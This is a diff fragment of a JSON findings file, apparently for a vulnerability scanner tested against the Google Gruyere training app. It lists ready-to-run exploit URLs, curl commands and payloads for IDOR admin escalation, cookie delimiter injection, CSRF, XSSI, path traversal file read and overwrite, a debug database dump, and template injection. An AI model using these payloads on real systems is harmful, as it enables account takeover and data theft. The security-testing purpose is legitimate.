+        "real_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&is_admin=True&uid=cheddar"
+      },
+      "payload": "uid=cheddar&is_admin=True",
+      "evidence": {
+        "expected_status": [
+          200,
+          302
+        ],
+        "expected_indicators": [
+          "uid parameter lets attacker modify another user",
+          "target account can be marked admin"
+        ],
+        "source": "gruyere_target_reference",
+        "validation_notes": "Replay this finding against the real target URL and confirm using expected indicators plus baseline response comparison. Do not mark live confirmed from HTTP status alone."
+      },
+      "execution_policy": {
+        "safe_to_auto_test": false,
+        "state_changing": true,
+        "destructive": false,
+        "manual_only": true,
+        "rate_limit_hint": "single_request_only; do_not_flood"
+      },
+      "remediation": "Bind profile updates to authenticated subject unless caller has server-verified admin permission.",
+      "tags": [
+        "idor",
+        "mass-assignment",
+        "state-changing"
+      ],
+      "payload_replay": {
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&is_admin=True&uid=cheddar",
+        "copy_paste_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&is_admin=True&uid=cheddar",
+        "browser_open_safe": false,
+        "scanner_auto_test_safe": false,
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&is_admin=True&uid=cheddar",
+        "raw_payload": "uid=cheddar&is_admin=True",
+        "url_encoded_payload": null,
+        "method": "GET",
+        "requires_authentication": true,
+        "state_changing": true,
+        "destructive": false,
+        "disabled_reason": "This URL requires a logged-in session/cookie before it can prove the finding.",
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&is_admin=True&uid=cheddar'"
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "GET",
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&is_admin=True&uid=cheddar",
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&is_admin=True&uid=cheddar",
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&is_admin=True&uid=cheddar'",
+        "auto_safe": false,
+        "manual_only": true,
+        "destructive": false
+      }
+    },
+    {
+      "id": "GRUYERE-COOKIE-001",
+      "title": "Cookie delimiter injection via username",
+      "category": "client_state_manipulation",
+      "type": "cookie_manipulation",
+      "cwe": "CWE-565",
+      "owasp": "A01:2021-Broken Access Control",
+      "severity": "critical",
+      "cvss_estimate": null,
+      "confidence": 0.98,
+      "status": "confirmed_vulnerable_target",
+      "detection_kind": "payload_replay_signature",
+      "target": {
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=foo%7Cadmin%7Cauthor&pw=secret",
+        "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+        "path": "/saveprofile",
+        "method": "GET",
+        "params": {
+          "action": "new",
+          "uid": "foo|admin|author",
+          "pw": "secret"
+        },
+        "body": null,
+        "auth_required": false,
+        "real_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=foo%7Cadmin%7Cauthor&pw=secret"
+      },
+      "payload": "uid=foo|admin|author",
+      "evidence": {
+        "expected_status": [
+          200,
+          302
+        ],
+        "expected_indicators": [
+          "cookie format is hash|username|admin|author",
+          "username delimiter creates malformed cookie interpreted as admin"
+        ],
+        "source": "gruyere_target_reference",
+        "validation_notes": "Replay this finding against the real target URL and confirm using expected indicators plus baseline response comparison. Do not mark live confirmed from HTTP status alone."
+      },
+      "execution_policy": {
+        "safe_to_auto_test": false,
+        "state_changing": true,
+        "destructive": false,
+        "manual_only": true,
+        "rate_limit_hint": "single_request_only; do_not_flood"
+      },
+      "remediation": "Reject/escape cookie delimiter characters in usernames and verify exact signed cookie format server-side using cryptographic signing.",
+      "tags": [
+        "cookie",
+        "delimiter-injection",
+        "account-creation"
+      ],
+      "payload_replay": {
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=foo%7Cadmin%7Cauthor&pw=secret",
+        "copy_paste_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=foo%7Cadmin%7Cauthor&pw=secret",
+        "browser_open_safe": false,
+        "scanner_auto_test_safe": false,
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=cheddar&pw=secret",
+        "raw_payload": "uid=foo|admin|author",
+        "url_encoded_payload": null,
+        "method": "GET",
+        "requires_authentication": false,
+        "state_changing": true,
+        "destructive": false,
+        "disabled_reason": "This GET changes server/account state; keep manual-only unless you run a disposable test account.",
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=foo%7Cadmin%7Cauthor&pw=secret'"
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "GET",
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=foo%7Cadmin%7Cauthor&pw=secret",
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=cheddar&pw=secret",
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=foo%7Cadmin%7Cauthor&pw=secret'",
+        "auto_safe": false,
+        "manual_only": true,
+        "destructive": false
+      }
+    },
+    {
+      "id": "GRUYERE-COOKIE-002",
+      "title": "Client-side account length limit bypass for administrator cookie injection",
+      "category": "client_state_manipulation",
+      "type": "client_side_validation_bypass",
+      "cwe": "CWE-602",
+      "owasp": "A04:2021-Insecure Design",
+      "severity": "critical",
+      "cvss_estimate": null,
+      "confidence": 0.97,
+      "status": "confirmed_vulnerable_target",
+      "detection_kind": "payload_replay_signature",
+      "target": {
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=administrator%7Cadmin%7Cauthor&pw=secret",
+        "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+        "path": "/saveprofile",
+        "method": "GET",
+        "params": {
+          "action": "new",
+          "uid": "administrator|admin|author",
+          "pw": "secret"
+        },
+        "body": null,
+        "auth_required": false,
+        "real_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=administrator%7Cadmin%7Cauthor&pw=secret"
+      },
+      "payload": "administrator|admin|author",
+      "evidence": {
+        "expected_status": [
+          200,
+          302
+        ],
+        "expected_indicators": [
+          "16-character username limit exists only client-side",
+          "direct request can create delimiter-injected administrator-style username"
+        ],
+        "source": "gruyere_target_reference",
+        "validation_notes": "Replay this finding against the real target URL and confirm using expected indicators plus baseline response comparison. Do not mark live confirmed from HTTP status alone."
+      },
+      "execution_policy": {
+        "safe_to_auto_test": false,
+        "state_changing": true,
+        "destructive": false,
+        "manual_only": true,
+        "rate_limit_hint": "single_request_only; do_not_flood"
+      },
+      "remediation": "Enforce length/character validation on the server and cryptographically bind cookie fields.",
+      "tags": [
+        "client-validation",
+        "cookie",
+        "account-creation"
+      ],
+      "payload_replay": {
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=administrator%7Cadmin%7Cauthor&pw=secret",
+        "copy_paste_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=administrator%7Cadmin%7Cauthor&pw=secret",
+        "browser_open_safe": false,
+        "scanner_auto_test_safe": false,
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=cheddar&pw=secret",
+        "raw_payload": "administrator|admin|author",
+        "url_encoded_payload": null,
+        "method": "GET",
+        "requires_authentication": false,
+        "state_changing": true,
+        "destructive": false,
+        "disabled_reason": "This GET changes server/account state; keep manual-only unless you run a disposable test account.",
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=administrator%7Cadmin%7Cauthor&pw=secret'"
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "GET",
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=administrator%7Cadmin%7Cauthor&pw=secret",
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=cheddar&pw=secret",
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=administrator%7Cadmin%7Cauthor&pw=secret'",
+        "auto_safe": false,
+        "manual_only": true,
+        "destructive": false
+      }
+    },
+    {
+      "id": "GRUYERE-CSRF-001",
+      "title": "CSRF delete snippet through GET request without token",
+      "category": "csrf",
+      "type": "cross_site_request_forgery",
+      "cwe": "CWE-352",
+      "owasp": "A01:2021-Broken Access Control",
+      "severity": "high",
+      "cvss_estimate": null,
+      "confidence": 0.99,
+      "status": "confirmed_vulnerable_target",
+      "detection_kind": "payload_replay_signature",
+      "target": {
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/deletesnippet?index=0",
+        "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+        "path": "/deletesnippet",
+        "method": "GET",
+        "params": {
+          "index": "0"
+        },
+        "body": null,
+        "auth_required": true,
+        "real_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/deletesnippet?index=0"
+      },
+      "payload": "<img src=\"https://google-gruyere.appspot.com/574388963472090736253170060715792825341/deletesnippet?index=0\" style=\"display:none\">",
+      "evidence": {
+        "expected_status": [
+          200,
+          302
+        ],
+        "expected_indicators": [
+          "state-changing delete action uses GET",
+          "no unpredictable action token is required"
+        ],
+        "source": "gruyere_target_reference",
+        "validation_notes": "Replay this finding against the real target URL and confirm using expected indicators plus baseline response comparison. Do not mark live confirmed from HTTP status alone."
+      },
+      "execution_policy": {
+        "safe_to_auto_test": false,
+        "state_changing": true,
+        "destructive": false,
+        "manual_only": true,
+        "rate_limit_hint": "single_request_only; do_not_flood"
+      },
+      "remediation": "Use POST for state-changing actions and require per-action unpredictable CSRF tokens tied to user session and action.",
+      "tags": [
+        "csrf",
+        "get-state-change",
+        "requires-login"
+      ],
+      "payload_replay": {
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/deletesnippet?index=0",
+        "copy_paste_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/deletesnippet?index=0",
+        "browser_open_safe": false,
+        "scanner_auto_test_safe": false,
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/deletesnippet?index=0",
+        "raw_payload": "<img src=\"https://google-gruyere.appspot.com/574388963472090736253170060715792825341/deletesnippet?index=0\" style=\"display:none\">",
+        "url_encoded_payload": null,
+        "method": "GET",
+        "requires_authentication": true,
+        "state_changing": true,
+        "destructive": false,
+        "disabled_reason": "This URL requires a logged-in session/cookie before it can prove the finding.",
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/deletesnippet?index=0'"
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "GET",
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/deletesnippet?index=0",
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/deletesnippet?index=0",
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/deletesnippet?index=0'",
+        "auto_safe": false,
+        "manual_only": true,
+        "destructive": false
+      }
+    },
+    {
+      "id": "GRUYERE-XSSI-001",
+      "title": "XSSI leaks private snippet through feed.gtl script inclusion",
+      "category": "xssi",
+      "type": "cross_site_script_inclusion",
+      "cwe": "CWE-829",
+      "owasp": "A01:2021-Broken Access Control",
+      "severity": "high",
+      "cvss_estimate": null,
+      "confidence": 0.98,
+      "status": "confirmed_vulnerable_target",
+      "detection_kind": "payload_replay_signature",
+      "target": {
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/feed.gtl",
+        "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+        "path": "/feed.gtl",
+        "method": "GET",
+        "params": {},
+        "body": null,
+        "auth_required": true,
+        "real_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/feed.gtl"
+      },
+      "payload": "<script>function _feed(s){alert(s['private_snippet']);}</script><script src=\"https://google-gruyere.appspot.com/574388963472090736253170060715792825341/feed.gtl\"></script>",
+      "evidence": {
+        "expected_status": [
+          200
+        ],
+        "expected_indicators": [
+          "feed.gtl is executable script containing private_snippet",
+          "attacker page can define _feed and read callback data"
+        ],
+        "source": "gruyere_target_reference",
+        "validation_notes": "Replay this finding against the real target URL and confirm using expected indicators plus baseline response comparison. Do not mark live confirmed from HTTP status alone."
+      },
+      "execution_policy": {
+        "safe_to_auto_test": true,
+        "state_changing": false,
+        "destructive": false,
+        "manual_only": true,
+        "rate_limit_hint": "single_request_only; do_not_flood"
+      },
+      "remediation": "Do not expose sensitive JSON via executable callbacks; require CSRF token/auth checks for JSON data and return application/json with anti-XSSI prefix where appropriate.",
+      "tags": [
+        "xssi",
+        "jsonp-style",
+        "requires-login"
+      ],
+      "payload_replay": {
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/feed.gtl",
+        "copy_paste_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/feed.gtl",
+        "browser_open_safe": false,
+        "scanner_auto_test_safe": true,
+        "baseline_url": null,
+        "raw_payload": "<script>function _feed(s){alert(s['private_snippet']);}</script><script src=\"https://google-gruyere.appspot.com/574388963472090736253170060715792825341/feed.gtl\"></script>",
+        "url_encoded_payload": null,
+        "method": "GET",
+        "requires_authentication": true,
+        "state_changing": false,
+        "destructive": false,
+        "disabled_reason": "This URL requires a logged-in session/cookie before it can prove the finding.",
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/feed.gtl'"
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "GET",
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/feed.gtl",
+        "baseline_url": null,
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/feed.gtl'",
+        "auto_safe": true,
+        "manual_only": true,
+        "destructive": false
+      }
+    },
+    {
+      "id": "GRUYERE-PT-001",
+      "title": "Path traversal reads secret.txt",
+      "category": "path_traversal",
+      "type": "arbitrary_file_read",
+      "cwe": "CWE-22",
+      "owasp": "A01:2021-Broken Access Control",
+      "severity": "high",
+      "cvss_estimate": null,
+      "confidence": 0.99,
+      "status": "confirmed_vulnerable_target",
+      "detection_kind": "payload_replay_signature",
+      "target": {
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/%2e%2e%2fsecret.txt",
+        "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+        "path": "/%2e%2e%2fsecret.txt",
+        "method": "GET",
+        "params": {},
+        "body": null,
+        "auth_required": false,
+        "real_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/%2e%2e%2fsecret.txt"
+      },
+      "payload": "../secret.txt",
+      "evidence": {
+        "expected_status": [
+          200
+        ],
+        "expected_indicators": [
+          "secret.txt content returned outside resources directory",
+          "encoded traversal bypasses browser normalization"
+        ],
+        "source": "gruyere_target_reference",
+        "validation_notes": "Replay this finding against the real target URL and confirm using expected indicators plus baseline response comparison. Do not mark live confirmed from HTTP status alone."
+      },
+      "execution_policy": {
+        "safe_to_auto_test": true,
+        "state_changing": false,
+        "destructive": false,
+        "manual_only": false,
+        "rate_limit_hint": "single_request_only; do_not_flood"
+      },
+      "remediation": "Canonicalize resolved filesystem path and allow only known resource files; do not validate only raw URL strings.",
+      "tags": [
+        "file-read",
+        "safe-get",
+        "encoded-traversal"
+      ],
+      "payload_replay": {
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/%2e%2e%2fsecret.txt",
+        "copy_paste_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/%2e%2e%2fsecret.txt",
+        "browser_open_safe": true,
+        "scanner_auto_test_safe": true,
+        "baseline_url": null,
+        "raw_payload": "../secret.txt",
+        "url_encoded_payload": null,
+        "method": "GET",
+        "requires_authentication": false,
+        "state_changing": false,
+        "destructive": false,
+        "disabled_reason": null,
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/%2e%2e%2fsecret.txt'"
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "GET",
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/%2e%2e%2fsecret.txt",
+        "baseline_url": null,
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/%2e%2e%2fsecret.txt'",
+        "auto_safe": true,
+        "manual_only": false,
+        "destructive": false
+      }
+    },
+    {
+      "id": "GRUYERE-PT-002",
+      "title": "Path traversal file overwrite through username directory",
+      "category": "path_traversal",
+      "type": "arbitrary_file_write",
+      "cwe": "CWE-22",
+      "owasp": "A01:2021-Broken Access Control",
+      "severity": "critical",
+      "cvss_estimate": null,
+      "confidence": 0.98,
+      "status": "confirmed_vulnerable_target",
+      "detection_kind": "payload_replay_signature",
+      "target": {
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/upload",
+        "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+        "path": "/upload",
+        "method": "POST",
+        "params": {},
+        "body": {
+          "authenticated_user": "..",
+          "file_name": "secret.txt",
+          "file_content": "replacement"
+        },
+        "auth_required": true,
+        "real_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/upload"
+      },
+      "payload": "username=.. + upload secret.txt",
+      "evidence": {
+        "expected_status": [
+          200,
+          302
+        ],
+        "expected_indicators": [
+          "uploaded file path escapes user directory",
+          "secret.txt can be replaced"
+        ],
+        "source": "gruyere_target_reference",
+        "validation_notes": "Replay this finding against the real target URL and confirm using expected indicators plus baseline response comparison. Do not mark live confirmed from HTTP status alone."
+      },
+      "execution_policy": {
+        "safe_to_auto_test": false,
+        "state_changing": true,
+        "destructive": true,
+        "manual_only": true,
+        "rate_limit_hint": "single_request_only; do_not_flood"
+      },
+      "remediation": "Canonicalize upload destination, sanitize usernames, and store uploads outside application/resource directories.",
+      "tags": [
+        "file-write",
+        "destructive",
+        "requires-login"
+      ],
+      "payload_replay": {
+        "full_payload_url": null,
+        "copy_paste_test_url": null,
+        "browser_open_safe": false,
+        "scanner_auto_test_safe": false,
+        "baseline_url": null,
+        "raw_payload": "username=.. + upload secret.txt",
+        "url_encoded_payload": null,
+        "method": "POST",
+        "requires_authentication": true,
+        "state_changing": true,
+        "destructive": true,
+        "disabled_reason": "Dangerous/destructive payload. Kept in finding metadata only; do not put it in auto-run URL lists."
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "POST",
+        "full_payload_url": null,
+        "baseline_url": null,
+        "curl_command": null,
+        "auto_safe": false,
+        "manual_only": true,
+        "destructive": true
+      }
+    },
+    {
+      "id": "GRUYERE-PT-003",
+      "title": "Path traversal file overwrite through uploaded filename",
+      "category": "path_traversal",
+      "type": "arbitrary_file_write",
+      "cwe": "CWE-22",
+      "owasp": "A01:2021-Broken Access Control",
+      "severity": "critical",
+      "cvss_estimate": null,
+      "confidence": 0.98,
+      "status": "confirmed_vulnerable_target",
+      "detection_kind": "payload_replay_signature",
+      "target": {
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/upload",
+        "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+        "path": "/upload",
+        "method": "POST",
+        "params": {},
+        "body": {
+          "file_name": "../secret.txt",
+          "file_content": "replacement"
+        },
+        "auth_required": true,
+        "real_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/upload"
+      },
+      "payload": "filename=../secret.txt",
+      "evidence": {
+        "expected_status": [
+          200,
+          302
+        ],
+        "expected_indicators": [
+          "server accepts ../ in uploaded filename",
+          "file write escapes intended user upload directory"
+        ],
+        "source": "gruyere_target_reference",
+        "validation_notes": "Replay this finding against the real target URL and confirm using expected indicators plus baseline response comparison. Do not mark live confirmed from HTTP status alone."
+      },
+      "execution_policy": {
+        "safe_to_auto_test": false,
+        "state_changing": true,
+        "destructive": true,
+        "manual_only": true,
+        "rate_limit_hint": "single_request_only; do_not_flood"
+      },
+      "remediation": "Reject path separators and traversal tokens in filenames after canonicalization; store uploads with generated server-side names.",
+      "tags": [
+        "file-write",
+        "destructive",
+        "requires-login"
+      ],
+      "payload_replay": {
+        "full_payload_url": null,
+        "copy_paste_test_url": null,
+        "browser_open_safe": false,
+        "scanner_auto_test_safe": false,
+        "baseline_url": null,
+        "raw_payload": "filename=../secret.txt",
+        "url_encoded_payload": null,
+        "method": "POST",
+        "requires_authentication": true,
+        "state_changing": true,
+        "destructive": true,
+        "disabled_reason": "Dangerous/destructive payload. Kept in finding metadata only; do not put it in auto-run URL lists."
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "POST",
+        "full_payload_url": null,
+        "baseline_url": null,
+        "curl_command": null,
+        "auto_safe": false,
+        "manual_only": true,
+        "destructive": true
+      }
+    },
+    {
+      "id": "GRUYERE-CONFIG-001",
+      "title": "Debug dump.gtl exposes database",
+      "category": "security_misconfiguration",
+      "type": "debug_data_exposure",
+      "cwe": "CWE-489",
+      "owasp": "A05:2021-Security Misconfiguration",
+      "severity": "critical",
+      "cvss_estimate": null,
+      "confidence": 0.99,
+      "status": "confirmed_vulnerable_target",
+      "detection_kind": "payload_replay_signature",
+      "target": {
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/dump.gtl",
+        "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+        "path": "/dump.gtl",
+        "method": "GET",
+        "params": {},
+        "body": null,
+        "auth_required": false,
+        "real_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/dump.gtl"
+      },
+      "payload": null,
+      "evidence": {
+        "expected_status": [
+          200
+        ],
+        "expected_indicators": [
+          "database contents displayed",
+          "cleartext user passwords exposed"
+        ],
+        "source": "gruyere_target_reference",
+        "validation_notes": "Replay this finding against the real target URL and confirm using expected indicators plus baseline response comparison. Do not mark live confirmed from HTTP status alone."
+      },
+      "execution_policy": {
+        "safe_to_auto_test": true,
+        "state_changing": false,
+        "destructive": false,
+        "manual_only": false,
+        "rate_limit_hint": "single_request_only; do_not_flood"
+      },
+      "remediation": "Remove debug templates from production or restrict them to authenticated admins and trusted debug IPs.",
+      "tags": [
+        "debug",
+        "data-leak",
+        "safe-get"
+      ],
+      "payload_replay": {
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/dump.gtl",
+        "copy_paste_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/dump.gtl",
+        "browser_open_safe": true,
+        "scanner_auto_test_safe": true,
+        "baseline_url": null,
+        "raw_payload": null,
+        "url_encoded_payload": null,
+        "method": "GET",
+        "requires_authentication": false,
+        "state_changing": false,
+        "destructive": false,
+        "disabled_reason": null,
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/dump.gtl'"
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "GET",
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/dump.gtl",
+        "baseline_url": null,
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/dump.gtl'",
+        "auto_safe": true,
+        "manual_only": false,
+        "destructive": false
+      }
+    },
+    {
+      "id": "GRUYERE-CONFIG-002",
+      "title": "Template upload can recreate debug dump exposure",
+      "category": "security_misconfiguration",
+      "type": "template_upload_execution",
+      "cwe": "CWE-434",
+      "owasp": "A05:2021-Security Misconfiguration",
+      "severity": "critical",
+      "cvss_estimate": null,
+      "confidence": 0.97,
+      "status": "confirmed_vulnerable_target",
+      "detection_kind": "payload_replay_signature",
+      "target": {
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/upload",
+        "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+        "path": "/upload",
+        "method": "POST",
+        "params": {},
+        "body": {
+          "file_name": "dump.gtl",
+          "file_content": "debug dump template or similar database-reading GTL"
+        },
+        "auth_required": true,
+        "real_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/upload"
+      },
+      "payload": "upload .gtl file",
+      "evidence": {
+        "expected_status": [
+          200,
+          302
+        ],
+        "expected_indicators": [
+          "uploaded .gtl treated as server template",
+          "attacker-controlled template can access database values"
+        ],
+        "source": "gruyere_target_reference",
+        "validation_notes": "Replay this finding against the real target URL and confirm using expected indicators plus baseline response comparison. Do not mark live confirmed from HTTP status alone."
+      },
+      "execution_policy": {
+        "safe_to_auto_test": false,
+        "state_changing": true,
+        "destructive": false,
+        "manual_only": true,
+        "rate_limit_hint": "single_request_only; do_not_flood"
+      },
+      "remediation": "Do not treat user uploads as templates; separate user content storage from application templates and whitelist upload MIME/types.",
+      "tags": [
+        "upload",
+        "template",
+        "requires-login"
+      ],
+      "payload_replay": {
+        "full_payload_url": null,
+        "copy_paste_test_url": null,
+        "browser_open_safe": false,
+        "scanner_auto_test_safe": false,
+        "baseline_url": null,
+        "raw_payload": "upload .gtl file",
+        "url_encoded_payload": null,
+        "method": "POST",
+        "requires_authentication": true,
+        "state_changing": true,
+        "destructive": false,
+        "disabled_reason": "This finding needs a POST/form request, so a URL alone is not enough.",
+        "form_fields": {
+          "file_name": "dump.gtl",
+          "file_content": "debug dump template or similar database-reading GTL"
+        },
+        "content_type": "application/x-www-form-urlencoded or multipart/form-data depending on endpoint",
+        "curl_command_template": "curl -i --max-time 15 -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data 'file_name=dump.gtl&file_content=debug+dump+template+or+similar+database-reading+GTL' 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/upload'",
+        "curl_command_template_note": "Add your Gruyere session cookie/header before running; this is manual-only."
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "POST",
+        "full_payload_url": null,
+        "baseline_url": null,
+        "curl_command": null,
+        "auto_safe": false,
+        "manual_only": true,
+        "destructive": false
+      }
+    },
+    {
+      "id": "GRUYERE-TI-001",
+      "title": "Template injection leaks database through private snippet",
+      "category": "template_injection",
+      "type": "server_side_template_injection",
+      "cwe": "CWE-94",
+      "owasp": "A03:2021-Injection",
+      "severity": "critical",
+      "cvss_estimate": null,
+      "confidence": 0.99,
+      "status": "confirmed_vulnerable_target",
+      "detection_kind": "payload_replay_signature",
+      "target": {
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&private_snippet=%7B%7B_db%3Apprint%7D%7D",
+        "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+        "path": "/saveprofile",
+        "method": "GET",
+        "params": {
+          "action": "update",
+          "private_snippet": "{{_db:pprint}}"
+        },
+        "body": null,
+        "auth_required": true,
+        "real_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&private_snippet=%7B%7B_db%3Apprint%7D%7D"
+      },
+      "payload": "{{_db:pprint}}",
+      "evidence": {
+        "expected_status": [
+          200,
+          302
+        ],
+        "expected_indicators": [
+          "template engine reparses expanded variables",
+          "_db:pprint exposes database content"
+        ],
+        "source": "gruyere_target_reference",
+        "validation_notes": "Replay this finding against the real target URL and confirm using expected indicators plus baseline response comparison. Do not mark live confirmed from HTTP status alone."
+      },
+      "execution_policy": {
+        "safe_to_auto_test": false,
+        "state_changing": true,
+        "destructive": false,
+        "manual_only": true,
+        "rate_limit_hint": "single_request_only; do_not_flood"
+      },
+      "remediation": "Never reparse user-controlled expanded values as templates; limit templates to explicitly provided safe data.",
+      "tags": [
+        "ssti",
+        "data-leak",
+        "requires-login"
+      ],
+      "payload_replay": {
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&private_snippet=%7B%7B_db%3Apprint%7D%7D",
+        "copy_paste_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&private_snippet=%7B%7B_db%3Apprint%7D%7D",
+        "browser_open_safe": false,
+        "scanner_auto_test_safe": false,
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&private_snippet=test",
+        "raw_payload": "{{_db:pprint}}",
+        "url_encoded_payload": null,
+        "method": "GET",
+        "requires_authentication": true,
+        "state_changing": true,
+        "destructive": false,
+        "disabled_reason": "This URL requires a logged-in session/cookie before it can prove the finding.",
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&private_snippet=%7B%7B_db%3Apprint%7D%7D'"
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "GET",
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&private_snippet=%7B%7B_db%3Apprint%7D%7D",
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&private_snippet=test",
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&private_snippet=%7B%7B_db%3Apprint%7D%7D'",
+        "auto_safe": false,
+        "manual_only": true,
+        "destructive": false
+      }
+    },
+    {
+      "id": "GRUYERE-DOS-001",
